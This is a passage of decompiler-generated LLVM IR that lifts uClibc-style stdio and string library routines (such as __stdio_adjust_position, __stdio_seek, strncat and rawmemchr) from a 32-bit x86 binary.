  %v0_80558f6 = load i32, i32* @ebx, align 4
  %v1_80558f6 = inttoptr i32 %v0_80558f6 to i16*
  %v2_80558f6 = load i16, i16* %v1_80558f6, align 2
  br i1 %v4_80558ec, label %dec_label_pc_80558f6, label %dec_label_pc_80558f0

dec_label_pc_80558f0:                             ; preds = %dec_label_pc_80558ee
  %v3_80558f0 = or i16 %v2_80558f6, 4
  store i16 %v3_80558f0, i16* %v1_80558f6, align 2
  %v0_80558ff.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80558fc

dec_label_pc_80558f6:                             ; preds = %dec_label_pc_80558ee
  %v3_80558f6 = or i16 %v2_80558f6, 8
  store i16 %v3_80558f6, i16* %v1_80558f6, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80558fc

dec_label_pc_80558fc:                             ; preds = %dec_label_pc_80558d8, %entry, %dec_label_pc_80558f0, %dec_label_pc_80558f6
  %v0_80558ff = phi i32 [ %v4_80558e1, %dec_label_pc_80558d8 ], [ 0, %entry ], [ %v0_80558ff.pre, %dec_label_pc_80558f0 ], [ 0, %dec_label_pc_80558f6 ]
  %v2_80558fe = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80558fe, i32* @ebx, align 4
  ret i32 %v0_80558ff

; uselistorder directives
  uselistorder i16 %v2_80558f6, { 1, 0 }
  uselistorder i32 %v4_80558e1, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80558fc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80558d8, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8055910 = load i32, i32* %arg1, align 4
  store i32 %v2_8055910, i32* %esi.global-to-local, align 4
  %v1_8055917 = urem i32 %v2_8055910, 4
  %v2_8055917 = icmp eq i32 %v1_8055917, 0
  store i32 %v1_8055917, i32* %ecx.global-to-local, align 4
  br i1 %v2_8055917, label %dec_label_pc_8055946, label %dec_label_pc_805591c

dec_label_pc_805591c:                             ; preds = %entry
  %v1_805591e = add nsw i32 %v1_8055917, -1
  %v8_805591e = icmp eq i32 %v1_805591e, 0
  store i32 %v1_805591e, i32* @edx, align 4
  br i1 %v8_805591e, label %dec_label_pc_8055946, label %dec_label_pc_8055921

dec_label_pc_8055921:                             ; preds = %dec_label_pc_805591c
  %v3_8055921 = and i32 %v2_8055910, 2048
  %v4_8055921 = icmp eq i32 %v3_8055921, 0
  br i1 %v4_8055921, label %dec_label_pc_8055946, label %dec_label_pc_8055926

dec_label_pc_8055926:                             ; preds = %dec_label_pc_8055921
  %v6_8055926 = sub nsw i32 1, %v1_8055917
  %v7_8055926 = and i32 %v1_805591e, %v6_8055926
  %v8_8055926 = icmp slt i32 %v7_8055926, 0
  %v9_8055926 = icmp eq i32 %v1_8055917, 2
  %v10_8055926 = icmp ult i32 %v1_8055917, 2
  %v3_8055929 = icmp eq i1 %v10_8055926, %v8_8055926
  %v4_8055929 = icmp eq i1 %v9_8055926, false
  %v5_8055929 = and i1 %v4_8055929, %v3_8055929
  br i1 %v5_8055929, label %dec_label_pc_805599c, label %dec_label_pc_805592b

dec_label_pc_805592b:                             ; preds = %dec_label_pc_8055926
  %v1_805592b = add i32 %tmp6, 40
  %v2_805592b = inttoptr i32 %v1_805592b to i32*
  %v3_805592b = load i32, i32* %v2_805592b, align 4
  %v4_805592b = icmp eq i32 %v3_805592b, 0
  %v1_805592f = icmp eq i1 %v4_805592b, false
  br i1 %v1_805592f, label %dec_label_pc_805599c, label %dec_label_pc_8055931

dec_label_pc_8055931:                             ; preds = %dec_label_pc_805592b
  %v1_8055931 = add i32 %tmp6, 3
  %v2_8055931 = inttoptr i32 %v1_8055931 to i8*
  %v3_8055931 = load i8, i8* %v2_8055931, align 1
  %v4_8055931 = zext i8 %v3_8055931 to i32
  %v2_8055935 = sub nsw i32 %v1_805591e, %v4_8055931
  %v1_8055937 = add i32 %tmp6, 44
  %v2_8055937 = inttoptr i32 %v1_8055937 to i32*
  %v3_8055937 = load i32, i32* %v2_8055937, align 4
  %v1_805593b = add nsw i32 %v2_8055935, -1
  %tmp12 = icmp slt i32 %v3_8055937, 1
  br i1 %tmp12, label %dec_label_pc_8055946, label %dec_label_pc_8055940

dec_label_pc_8055940:                             ; preds = %dec_label_pc_8055931
  %v1_8055940 = add i32 %tmp6, 2
  %v2_8055940 = inttoptr i32 %v1_8055940 to i8*
  %v3_8055940 = load i8, i8* %v2_8055940, align 1
  %v4_8055940 = zext i8 %v3_8055940 to i32
  %v2_8055944 = sub nsw i32 %v1_805593b, %v4_8055940
  br label %dec_label_pc_8055946

dec_label_pc_8055946:                             ; preds = %dec_label_pc_8055931, %dec_label_pc_8055921, %dec_label_pc_805591c, %entry, %dec_label_pc_8055940
  %v0_805595d = phi i32 [ %v1_805593b, %dec_label_pc_8055931 ], [ %v1_805591e, %dec_label_pc_8055921 ], [ 0, %dec_label_pc_805591c ], [ 0, %entry ], [ %v2_8055944, %dec_label_pc_8055940 ]
  %v2_8055946 = and i32 %v2_8055910, 64
  %v3_8055946 = icmp eq i32 %v2_8055946, 0
  %storemerge.in.in.v = select i1 %v3_8055946, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8055955 = add i32 %tmp6, 16
  %v3_8055955 = inttoptr i32 %v2_8055955 to i32*
  %v4_8055955 = load i32, i32* %v3_8055955, align 4
  %v5_8055955 = sub i32 %storemerge, %v4_8055955
  %v1_8055958 = inttoptr i32 %arg2 to i32*
  %v2_8055958 = load i32, i32* %v1_8055958, align 4
  store i32 %v2_8055958, i32* %ecx.global-to-local, align 4
  %v1_805595a = add i32 %arg2, 4
  %v2_805595a = inttoptr i32 %v1_805595a to i32*
  %v3_805595a = load i32, i32* %v2_805595a, align 4
  store i32 %v3_805595a, i32* %ebx.global-to-local, align 4
  %v2_805595d = add i32 %v5_8055955, %v0_805595d
  store i32 %v2_805595d, i32* %esi.global-to-local, align 4
  %v2_8055968 = ashr i32 %v2_805595d, 31
  %v5_8055971 = sub i32 %v2_8055958, %v2_805595d
  %v10_8055971 = icmp ult i32 %v2_8055958, %v2_805595d
  %v6_8055975 = zext i1 %v10_8055971 to i32
  %tmp = icmp slt i32 %v2_805595d, 0
  %v2_8055968.neg = zext i1 %tmp to i32
  %v7_8055975 = add i32 %v3_805595a, %v2_8055968.neg
  %v8_8055975 = add i32 %v7_8055975, %v6_8055975
  store i32 %v8_8055975, i32* @edx, align 4
  store i32 %v5_8055971, i32* %v1_8055958, align 4
  %v0_805597b = load i32, i32* @edx, align 4
  %v1_805597b = load i32, i32* %edi.global-to-local, align 4
  %v2_805597b = add i32 %v1_805597b, 4
  %v3_805597b = inttoptr i32 %v2_805597b to i32*
  store i32 %v0_805597b, i32* %v3_805597b, align 4
  %v0_805597e = load i32, i32* %edi.global-to-local, align 4
  %v1_805597e = add i32 %v0_805597e, 4
  %v2_805597e = inttoptr i32 %v1_805597e to i32*
  %v3_805597e = load i32, i32* %v2_805597e, align 4
  %v4_805597e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8055981 = icmp slt i32 %v3_805597e, %v4_805597e
  br i1 %v5_8055981, label %dec_label_pc_805598b, label %dec_label_pc_8055983

dec_label_pc_8055983:                             ; preds = %dec_label_pc_8055946
  %v8_8055983 = icmp sgt i32 %v3_805597e, %v4_805597e
  br i1 %v8_8055983, label %dec_label_pc_8055989, label %dec_label_pc_8055985

dec_label_pc_8055985:                             ; preds = %dec_label_pc_8055983
  %v1_8055985 = inttoptr i32 %v0_805597e to i32*
  %v2_8055985 = load i32, i32* %v1_8055985, align 4
  %v3_8055985 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8055985, %v3_8055985
  br i1 %tmp14, label %dec_label_pc_8055989, label %dec_label_pc_805598b

dec_label_pc_8055989:                             ; preds = %dec_label_pc_8055985, %dec_label_pc_8055983
  %v0_8055989 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055989 = sub i32 0, %v0_8055989
  store i32 %v1_8055989, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805598b

dec_label_pc_805598b:                             ; preds = %dec_label_pc_8055985, %dec_label_pc_8055946, %dec_label_pc_8055989
  %v0_805598b = load i32, i32* %esi.global-to-local, align 4
  %v2_805598b = icmp slt i32 %v0_805598b, 0
  %v1_805598d = icmp eq i1 %v2_805598b, false
  br i1 %v1_805598d, label %dec_label_pc_805599f, label %dec_label_pc_805598f

dec_label_pc_805598f:                             ; preds = %dec_label_pc_805598b
  %v1_805598f = call i32 @__errno_location(i32 %v2_8055968)
  %v1_8055994 = inttoptr i32 %v1_805598f to i32*
  store i32 75, i32* %v1_8055994, align 4
  %v0_80559a2.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805599f

dec_label_pc_805599c:                             ; preds = %dec_label_pc_805592b, %dec_label_pc_8055926
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805599f

dec_label_pc_805599f:                             ; preds = %dec_label_pc_805598b, %dec_label_pc_805598f, %dec_label_pc_805599c
  %v0_80559a2 = phi i32 [ %v0_805598b, %dec_label_pc_805598b ], [ %v0_80559a2.pre, %dec_label_pc_805598f ], [ -1, %dec_label_pc_805599c ]
  ret i32 %v0_80559a2

; uselistorder directives
  uselistorder i32 %v4_805597e, { 1, 0 }
  uselistorder i32 %v3_805597e, { 1, 0 }
  uselistorder i32 %v1_805591e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8055917, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8055910, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805599f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805598b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055946, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80559a8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80559b0 = add i32 %arg1, 8
  %v2_80559b0 = inttoptr i32 %v1_80559b0 to i32*
  %v3_80559b0 = load i32, i32* %v2_80559b0, align 4
  store i32 %v3_80559b0, i32* %edx.global-to-local, align 4
  %v1_80559b3 = add i32 %arg1, 12
  %v2_80559b3 = inttoptr i32 %v1_80559b3 to i32*
  %v3_80559b3 = load i32, i32* %v2_80559b3, align 4
  %v2_80559b6 = sub i32 %v3_80559b3, %v3_80559b0
  %v3_80559bb = inttoptr i32 %arg1 to i16*
  %v4_80559bb = call i32 @__stdio_READ(i16* %v3_80559bb, i32 %v3_80559b0, i32 %v2_80559b6)
  %v0_80559c0 = load i32, i32* @ebx, align 4
  %v1_80559c0 = add i32 %v0_80559c0, 8
  %v2_80559c0 = inttoptr i32 %v1_80559c0 to i32*
  %v3_80559c0 = load i32, i32* %v2_80559c0, align 4
  store i32 %v3_80559c0, i32* %edx.global-to-local, align 4
  %v2_80559c3 = add i32 %v0_80559c0, 16
  %v3_80559c3 = inttoptr i32 %v2_80559c3 to i32*
  store i32 %v3_80559c0, i32* %v3_80559c3, align 4
  %v0_80559c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80559c6 = add i32 %v0_80559c6, %v4_80559bb
  store i32 %v2_80559c6, i32* %edx.global-to-local, align 4
  %v1_80559c8 = load i32, i32* @ebx, align 4
  %v2_80559c8 = add i32 %v1_80559c8, 20
  %v3_80559c8 = inttoptr i32 %v2_80559c8 to i32*
  store i32 %v2_80559c6, i32* %v3_80559c8, align 4
  store i32 %v0_80559a8, i32* @ebx, align 4
  ret i32 %v4_80559bb

; uselistorder directives
  uselistorder i32 %v4_80559bb, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80559d0 = load i32, i32* @ebx, align 4
  %v4_80559d4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80559d4, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80559dc = bitcast i16* %arg1 to i32*
  %v2_80559dc = load i32, i32* %v1_80559dc, align 4
  %v1_80559de = urem i32 %v2_80559dc, 65536
  %v2_80559e1 = and i32 %v1_80559de, %arg2
  %v3_80559e1 = icmp eq i32 %v2_80559e1, 0
  %v1_80559e3 = icmp eq i1 %v3_80559e1, false
  br i1 %v1_80559e3, label %dec_label_pc_80559f2, label %dec_label_pc_80559e5

dec_label_pc_80559e5:                             ; preds = %entry
  %v1_80559e5 = and i32 %v2_80559dc, 2176
  %v2_80559e5 = icmp eq i32 %v1_80559e5, 0
  %v1_80559eb = icmp eq i1 %v2_80559e5, false
  br i1 %v1_80559eb, label %dec_label_pc_80559f9, label %dec_label_pc_80559ed

dec_label_pc_80559ed:                             ; preds = %dec_label_pc_80559e5
  %v2_80559ed = or i32 %v2_80559dc, %arg2
  %v1_80559ef = trunc i32 %v2_80559ed to i16
  store i16 %v1_80559ef, i16* %arg1, align 2
  %v0_80559f2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80559f2

dec_label_pc_80559f2:                             ; preds = %entry, %dec_label_pc_80559ed
  %v0_8055a14 = phi i32 [ %v4_80559d4, %entry ], [ %v0_80559f2.pre, %dec_label_pc_80559ed ]
  %v1_80559f2 = inttoptr i32 %v0_8055a14 to i16*
  %v2_80559f2 = load i16, i16* %v1_80559f2, align 2
  %v2_80559f5 = and i16 %v2_80559f2, 16
  %v3_80559f5 = icmp eq i16 %v2_80559f5, 0
  br i1 %v3_80559f5, label %dec_label_pc_8055a0d, label %dec_label_pc_80559f9

dec_label_pc_80559f9:                             ; preds = %dec_label_pc_80559f2, %dec_label_pc_80559e5
  %v1_80559f9 = call i32 @__errno_location(i32 %v0_80559d0)
  %v1_80559fe = inttoptr i32 %v1_80559f9 to i32*
  store i32 9, i32* %v1_80559fe, align 4
  br label %dec_label_pc_8055a04

dec_label_pc_8055a04:                             ; preds = %dec_label_pc_8055a11, %dec_label_pc_80559f9
  %v0_8055a04 = load i32, i32* @ebx, align 4
  %v1_8055a04 = inttoptr i32 %v0_8055a04 to i16*
  %v2_8055a04 = load i16, i16* %v1_8055a04, align 2
  %v3_8055a04 = or i16 %v2_8055a04, 8
  store i16 %v3_8055a04, i16* %v1_8055a04, align 2
  br label %dec_label_pc_8055a31

dec_label_pc_8055a0d:                             ; preds = %dec_label_pc_80559f2
  %v2_8055a0d = and i16 %v2_80559f2, 64
  %v3_8055a0d = icmp eq i16 %v2_8055a0d, 0
  br i1 %v3_8055a0d, label %dec_label_pc_8055a2b, label %dec_label_pc_8055a11

dec_label_pc_8055a11:                             ; preds = %dec_label_pc_8055a0d
  %v2_8055a15 = call i32 @__stdio_wcommit(i32 %v0_8055a14)
  %v1_8055a1d = icmp eq i32 %v2_8055a15, 0
  %v1_8055a1f = icmp eq i1 %v1_8055a1d, false
  br i1 %v1_8055a1f, label %dec_label_pc_8055a04, label %dec_label_pc_8055a21

dec_label_pc_8055a21:                             ; preds = %dec_label_pc_8055a11
  %v0_8055a21 = load i32, i32* @ebx, align 4
  %v1_8055a21 = inttoptr i32 %v0_8055a21 to i16*
  %v2_8055a21 = load i16, i16* %v1_8055a21, align 2
  %v3_8055a21 = and i16 %v2_8055a21, -65
  store i16 %v3_8055a21, i16* %v1_8055a21, align 2
  %v0_8055a25 = load i32, i32* @ebx, align 4
  %v1_8055a25 = add i32 %v0_8055a25, 8
  %v2_8055a25 = inttoptr i32 %v1_8055a25 to i32*
  %v3_8055a25 = load i32, i32* %v2_8055a25, align 4
  %v2_8055a28 = add i32 %v0_8055a25, 28
  %v3_8055a28 = inttoptr i32 %v2_8055a28 to i32*
  store i32 %v3_8055a25, i32* %v3_8055a28, align 4
  %v0_8055a2b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055a2b

dec_label_pc_8055a2b:                             ; preds = %dec_label_pc_8055a0d, %dec_label_pc_8055a21
  %v9_8055a2b = phi i32 [ %v0_8055a14, %dec_label_pc_8055a0d ], [ %v0_8055a2b.pre, %dec_label_pc_8055a21 ]
  %v1_8055a2b = inttoptr i32 %v9_8055a2b to i16*
  %v2_8055a2b = load i16, i16* %v1_8055a2b, align 2
  %v3_8055a2b = or i16 %v2_8055a2b, 1
  store i16 %v3_8055a2b, i16* %v1_8055a2b, align 2
  br label %dec_label_pc_8055a31

dec_label_pc_8055a31:                             ; preds = %dec_label_pc_8055a04, %dec_label_pc_8055a2b
  %storemerge = phi i32 [ 0, %dec_label_pc_8055a2b ], [ -1, %dec_label_pc_8055a04 ]
  store i32 %v0_80559d0, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80559dc, { 1, 2, 0 }
  uselistorder i32 %v0_80559d0, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055a31, { 1, 0 }
  uselistorder label %dec_label_pc_8055a2b, { 1, 0 }
  uselistorder label %dec_label_pc_80559f2, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8055a44 = add i32 %tmp5, 4
  %v2_8055a44 = inttoptr i32 %v1_8055a44 to i32*
  %v3_8055a44 = load i32, i32* %v2_8055a44, align 4
  %v2_8055a47 = load i32, i32* %arg2, align 4
  %v1_8055a4d = add i32 %arg1, 4
  %v2_8055a4d = inttoptr i32 %v1_8055a4d to i32*
  %v3_8055a4d = load i32, i32* %v2_8055a4d, align 4
  %v4_8055a50 = call i32 @__libc_lseek64(i32 %v3_8055a4d, i32 %v2_8055a47, i32 %v3_8055a44, i32 %arg3)
  %v0_8055a5a = load i32, i32* @edx, align 4
  %v2_8055a5a = icmp slt i32 %v0_8055a5a, 0
  br i1 %v2_8055a5a, label %dec_label_pc_8055a65, label %dec_label_pc_8055a5e

dec_label_pc_8055a5e:                             ; preds = %entry
  %v1_8055a5e = load i32, i32* @ebx, align 4
  %v2_8055a5e = inttoptr i32 %v1_8055a5e to i32*
  store i32 %v4_8055a50, i32* %v2_8055a5e, align 4
  %v0_8055a60 = load i32, i32* @edx, align 4
  %v1_8055a60 = load i32, i32* @ebx, align 4
  %v2_8055a60 = add i32 %v1_8055a60, 4
  %v3_8055a60 = inttoptr i32 %v2_8055a60 to i32*
  store i32 %v0_8055a60, i32* %v3_8055a60, align 4
  br label %dec_label_pc_8055a65

dec_label_pc_8055a65:                             ; preds = %entry, %dec_label_pc_8055a5e
  %v0_8055a65 = phi i32 [ %v4_8055a50, %entry ], [ 0, %dec_label_pc_8055a5e ]
  ret i32 %v0_8055a65

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8055a65, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8055a6e = ptrtoint i8* %arg1 to i32
  %v4_8055a76.pre = load i32, i32* @eax, align 4
  %v8_8055a76.pre = load i1, i1* @df, align 1
  %v9_8055a76 = select i1 %v8_8055a76.pre, i32 -1, i32 1
  br label %dec_label_pc_8055a76

dec_label_pc_8055a76:                             ; preds = %dec_label_pc_8055a7a, %entry
  %v20_8055a77 = phi i32 [ %v23_8055a77, %dec_label_pc_8055a7a ], [ %arg2, %entry ]
  %v4_8055a76 = phi i32 [ %v6_8055a76, %dec_label_pc_8055a7a ], [ %v4_8055a76.pre, %entry ]
  %v7_8055a76 = phi i32 [ %v10_8055a76, %dec_label_pc_8055a7a ], [ %v4_8055a6e, %entry ]
  %v1_8055a76 = inttoptr i32 %v7_8055a76 to i8*
  %v2_8055a76 = load i8, i8* %v1_8055a76, align 1
  %v3_8055a77 = inttoptr i32 %v20_8055a77 to i8*
  %v4_8055a77 = load i8, i8* %v3_8055a77, align 1
  %v15_8055a77 = icmp eq i8 %v2_8055a76, %v4_8055a77
  %v1_8055a78 = icmp eq i1 %v15_8055a77, false
  br i1 %v1_8055a78, label %dec_label_pc_8055a82, label %dec_label_pc_8055a7a

dec_label_pc_8055a7a:                             ; preds = %dec_label_pc_8055a76
  %v3_8055a76 = zext i8 %v2_8055a76 to i32
  %v5_8055a76 = and i32 %v4_8055a76, -256
  %v6_8055a76 = or i32 %v3_8055a76, %v5_8055a76
  %v23_8055a77 = add i32 %v20_8055a77, %v9_8055a76
  %v10_8055a76 = add i32 %v7_8055a76, %v9_8055a76
  %v4_8055a7a = icmp eq i8 %v2_8055a76, 0
  %v1_8055a7c = icmp eq i1 %v4_8055a7a, false
  br i1 %v1_8055a7c, label %dec_label_pc_8055a76, label %dec_label_pc_8055a86

dec_label_pc_8055a82:                             ; preds = %dec_label_pc_8055a76
  br label %dec_label_pc_8055a86

dec_label_pc_8055a86:                             ; preds = %dec_label_pc_8055a7a, %dec_label_pc_8055a82
  %storemerge = phi i32 [ 1, %dec_label_pc_8055a82 ], [ 0, %dec_label_pc_8055a7a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8055a76, { 1, 2, 0 }
  uselistorder i32 %v9_8055a76, { 1, 0 }
  uselistorder label %dec_label_pc_8055a86, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_8055a8d = load i32, i32* @esi, align 4
  store i32 %v0_8055a8d, i32* %stack_var_-8, align 4
  %v4_8055a8e = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8055a8e, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8055a9b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8055a9f = call i32 @_strlen(i8* %v4_8055a9b)
  %v2_8055aa1 = add i32 %tmp, -1
  store i32 %v2_8055aa1, i32* %edi.global-to-local, align 4
  %v0_8055aa2 = load i32, i32* %edx.global-to-local, align 4
  %v8_8055aa510 = icmp eq i32 %v0_8055aa2, 0
  store i32 %v0_8055aa2, i32* %ecx.global-to-local, align 4
  br i1 %v8_8055aa510, label %dec_label_pc_8055ab0, label %dec_label_pc_8055aa8.lr.ph

dec_label_pc_8055aa8.lr.ph:                       ; preds = %entry
  %v4_8055aa8.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8055aa8.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8055aa8

dec_label_pc_8055aa8:                             ; preds = %dec_label_pc_8055aa8.lr.ph, %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge
  %v8_8055aa8 = phi i1 [ %v8_8055aa8.pre, %dec_label_pc_8055aa8.lr.ph ], [ %v5_8055aa9, %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge ]
  %v4_8055aa8 = phi i32 [ %v4_8055aa8.pre, %dec_label_pc_8055aa8.lr.ph ], [ %v0_8055aaa, %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge ]
  %v2_8055ab211 = phi i32 [ %v2_8055aa1, %dec_label_pc_8055aa8.lr.ph ], [ %v7_8055aa9, %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge ]
  %v0_8055aa8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055aa8 = inttoptr i32 %v0_8055aa8 to i8*
  %v2_8055aa8 = load i8, i8* %v1_8055aa8, align 1
  %v3_8055aa8 = zext i8 %v2_8055aa8 to i32
  %v5_8055aa8 = and i32 %v4_8055aa8, -256
  %v6_8055aa8 = or i32 %v5_8055aa8, %v3_8055aa8
  store i32 %v6_8055aa8, i32* %eax.global-to-local, align 4
  %v9_8055aa8 = select i1 %v8_8055aa8, i32 -1, i32 1
  %v10_8055aa8 = add i32 %v9_8055aa8, %v0_8055aa8
  store i32 %v10_8055aa8, i32* %esi.global-to-local, align 4
  %v3_8055aa9 = inttoptr i32 %v2_8055ab211 to i8*
  store i8 %v2_8055aa8, i8* %v3_8055aa9, align 1
  %v4_8055aa9 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055aa9 = load i1, i1* @df, align 1
  %v6_8055aa9 = select i1 %v5_8055aa9, i32 -1, i32 1
  %v7_8055aa9 = add i32 %v6_8055aa9, %v4_8055aa9
  store i32 %v7_8055aa9, i32* %edi.global-to-local, align 4
  %v0_8055aaa = load i32, i32* %eax.global-to-local, align 4
  %v3_8055aaa = trunc i32 %v0_8055aaa to i8
  %v4_8055aaa = icmp eq i8 %v3_8055aaa, 0
  %v1_8055aac = icmp eq i1 %v4_8055aaa, false
  br i1 %v1_8055aac, label %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge, label %dec_label_pc_8055ab3

dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge: ; preds = %dec_label_pc_8055aa8
  %v0_8055aa5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8055aa5 = add i32 %v0_8055aa5.pre, -1
  %v8_8055aa5 = icmp eq i32 %v1_8055aa5, 0
  store i32 %v1_8055aa5, i32* %ecx.global-to-local, align 4
  br i1 %v8_8055aa5, label %dec_label_pc_8055ab0, label %dec_label_pc_8055aa8

dec_label_pc_8055ab0:                             ; preds = %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge, %entry
  %v2_8055ab2.lcssa = phi i32 [ %v2_8055aa1, %entry ], [ %v7_8055aa9, %dec_label_pc_8055aa8.dec_label_pc_8055aa5_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8055ab2 = inttoptr i32 %v2_8055ab2.lcssa to i8*
  store i8 0, i8* %v3_8055ab2, align 1
  %v4_8055ab2 = load i32, i32* %edi.global-to-local, align 4
  %v5_8055ab2 = load i1, i1* @df, align 1
  %v6_8055ab2 = select i1 %v5_8055ab2, i32 -1, i32 1
  %v7_8055ab2 = add i32 %v6_8055ab2, %v4_8055ab2
  store i32 %v7_8055ab2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055ab3

dec_label_pc_8055ab3:                             ; preds = %dec_label_pc_8055aa8, %dec_label_pc_8055ab0
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8055ab7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055ab7, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8055aa5, { 1, 0 }
  uselistorder i32 %v0_8055aaa, { 1, 0 }
  uselistorder i32 %v7_8055aa9, { 0, 2, 1 }
  uselistorder i1 %v5_8055aa9, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055ab3, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa8, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055abd = load i32, i32* @ebx, align 4
  %v4_8055abe = urem i32 %arg2, 256
  %v4_8055ac2 = ptrtoint i8* %arg1 to i32
  %v2_8055acd3 = urem i32 %v4_8055ac2, 4
  %v3_8055acd4 = icmp eq i32 %v2_8055acd3, 0
  %v1_8055acf8 = icmp eq i1 %v3_8055acd4, false
  %v4_8055ac8 = trunc i32 %arg2 to i8
  br i1 %v1_8055acf8, label %dec_label_pc_8055ac8, label %dec_label_pc_8055ad1

dec_label_pc_8055ac8:                             ; preds = %entry, %dec_label_pc_8055acc
  %v0_8055acc = phi i32 [ %v1_8055acc, %dec_label_pc_8055acc ], [ %v4_8055ac2, %entry ]
  %v1_8055ac8 = inttoptr i32 %v0_8055acc to i8*
  %v2_8055ac8 = load i8, i8* %v1_8055ac8, align 1
